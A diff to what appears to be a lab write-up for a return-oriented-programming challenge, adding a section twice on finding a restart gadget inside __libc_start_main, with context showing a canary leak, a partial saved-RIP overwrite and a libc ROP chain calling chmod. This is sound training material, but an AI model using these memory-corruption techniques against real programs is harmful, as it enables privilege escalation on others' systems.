@@ -11732,7 +11732,7 @@ Three problems to solve: canary, ASLR, and privilege. The trick is doing it in *
 #### Stage 1: Leak canary, restart `main()`
  
 1. Use the arbitrary read primitive to fetch `buf + 72`, exactly where the canary lives on the stack.
-2. Overwrite only the low 2 bytes of saved RIP with a value targeting `__libc_start_main+0x69` inside libc. That offset contains:
+2. Partially overwrite only the low 2 bytes of saved RIP with a value targeting `__libc_start_main+0x69` inside Libc. That offset contains:
 ```
 mov argv from lsm_stack → rsi
 mov argc from lsm_stack → edi
@@ -12178,6 +12178,61 @@ pop_rdi = 0x737019a88000 + 0x23b6a = 0x737019aabb6a
 pop_rsi = 0x737019a88000 + 0x2601f = 0x737019aae01f
 chmod   = 0x737019a88000 + 0x10dd80 = 0x737019b95d80
 ```
+
+### Finding the restart gadget inside `__libc_start_main`
+
+We need to find a spot inside `__libc_start_main` that sets up and calls `main()`, so we can jump into it to restart `main()` in the same process.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ objdump -d /lib/x86_64-linux-gnu/libc.so.6 | awk '/23f90/,/24085/'
+   23f90:       f3 0f 1e fa             endbr64
+   23f94:       41 57                   push   %r15
+   23f96:       31 c0                   xor    %eax,%eax
+   23f98:       41 56                   push   %r14
+   23f9a:       41 55                   push   %r13
+   23f9c:       41 54                   push   %r12
+   23f9e:       55                      push   %rbp
+   23f9f:       53                      push   %rbx
+   23fa0:       48 89 cb                mov    %rcx,%rbx
+   23fa3:       48 81 ec 98 00 00 00    sub    $0x98,%rsp
+   23faa:       48 89 54 24 08          mov    %rdx,0x8(%rsp)
+   23faf:       48 8b 15 8a 7f 1c 00    mov    0x1c7f8a(%rip),%rdx
+   23fb6:       48 89 7c 24 18          mov    %rdi,0x18(%rsp)
+
+# ---- snip ----
+
+   24069:       48 8b 05 40 7e 1c 00    mov    0x1c7e40(%rip),%rax
+   24070:       48 8b 74 24 08          mov    0x8(%rsp),%rsi
+   24075:       8b 7c 24 14             mov    0x14(%rsp),%edi
+   24079:       48 8b 10                mov    (%rax),%rdx
+   2407c:       48 8b 44 24 18          mov    0x18(%rsp),%rax
+   24081:       ff d0                   call   *%rax
+   24083:       89 c7                   mov    %eax,%edi
+   24085:       e8 b6 29 02 00          call   46a40 <exit@@GLIBC_2.2.5>
+```
+
+The setup begins at `+0x69` (`24069`):
+
+- `24070`: loads `argv` from `0x8(%rsp)` into `rsi`
+- `24075`: loads `argc` from `0x14(%rsp)` into `edi`
+- `2407c`: loads the `main` pointer from `0x18(%rsp)` into `rax`
+- `24081`: calls `main()` via `call *%rax`
+
+We know `call *%rax` is calling `main()` specifically because `rax` is loaded from `0x18(%rsp)`, which was written at `+0x26`:
+
+```
+23fb6:  mov  %rdi,0x18(%rsp)    ← rdi = first argument to __libc_start_main = main pointer
+```
+
+The first argument to `__libc_start_main` is always the `main` pointer per its signature:
+
+```c
+int __libc_start_main(int (*main)(int, char**, char**), int argc, char **argv, ...);
+```
+
+So `+0x69` is our restart gadget — jumping here reloads all of `main()`'s arguments from `__libc_start_main`'s own stack frame and calls it cleanly.
+
+The instruction at `24083` (`+0xf3`) is the return site after `call *%rax` — the address pushed onto the stack when `main()` was called. This is the `__libc_start_main+243` we saw in the pwndbg backtrace, and what we read off the stack at `buf + 88` to leak the libc base.
 
 ### ROP chain
 
@@ -12805,6 +12860,62 @@ pop_rdi = 0x757e58b30000 + 0x23b6a = 0x757e58b53b6a
 pop_rsi = 0x757e58b30000 + 0x2601f = 0x757e58b5601f
 chmod   = 0x757e58b30000 + 0x10dd80 = 0x757e58c3dd80
 ```
+
+### Finding the restart gadget inside `__libc_start_main`
+
+We need to find a spot inside `__libc_start_main` that sets up and calls `main()`, so we can jump into it to restart `main()` in the same process.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ objdump -d /lib/x86_64-linux-gnu/libc.so.6 | awk '/23f90/,/24085/'
+   23f90:       f3 0f 1e fa             endbr64
+   23f94:       41 57                   push   %r15
+   23f96:       31 c0                   xor    %eax,%eax
+   23f98:       41 56                   push   %r14
+   23f9a:       41 55                   push   %r13
+   23f9c:       41 54                   push   %r12
+   23f9e:       55                      push   %rbp
+   23f9f:       53                      push   %rbx
+   23fa0:       48 89 cb                mov    %rcx,%rbx
+   23fa3:       48 81 ec 98 00 00 00    sub    $0x98,%rsp
+   23faa:       48 89 54 24 08          mov    %rdx,0x8(%rsp)
+   23faf:       48 8b 15 8a 7f 1c 00    mov    0x1c7f8a(%rip),%rdx
+   23fb6:       48 89 7c 24 18          mov    %rdi,0x18(%rsp)
+
+# ---- snip ----
+
+   24069:       48 8b 05 40 7e 1c 00    mov    0x1c7e40(%rip),%rax
+   24070:       48 8b 74 24 08          mov    0x8(%rsp),%rsi
+   24075:       8b 7c 24 14             mov    0x14(%rsp),%edi
+   24079:       48 8b 10                mov    (%rax),%rdx
+   2407c:       48 8b 44 24 18          mov    0x18(%rsp),%rax
+   24081:       ff d0                   call   *%rax
+   24083:       89 c7                   mov    %eax,%edi
+   24085:       e8 b6 29 02 00          call   46a40 <exit@@GLIBC_2.2.5>
+```
+
+The setup begins at `+0x69` (`24069`):
+
+- `24070`: loads `argv` from `0x8(%rsp)` into `rsi`
+- `24075`: loads `argc` from `0x14(%rsp)` into `edi`
+- `2407c`: loads the `main` pointer from `0x18(%rsp)` into `rax`
+- `24081`: calls `main()` via `call *%rax`
+
+We know `call *%rax` is calling `main()` specifically because `rax` is loaded from `0x18(%rsp)`, which was written at `+0x26`:
+
+```
+23fb6:  mov  %rdi,0x18(%rsp)    ← rdi = first argument to __libc_start_main = main pointer
+```
+
+The first argument to `__libc_start_main` is always the `main` pointer per its signature:
+
+```c
+int __libc_start_main(int (*main)(int, char**, char**), int argc, char **argv, ...);
+```
+
+So `+0x69` is our restart gadget — jumping here reloads all of `main()`'s arguments from `__libc_start_main`'s own stack frame and calls it cleanly.
+
+The instruction at `24083` (`+0xf3`) is the return site after `call *%rax` — the address pushed onto the stack when `main()` was called. This is the `__libc_start_main+243` we saw in the pwndbg backtrace, and what we read off the stack at `buf + 88` to leak the libc base.
+
 
 ### ROP chain
 
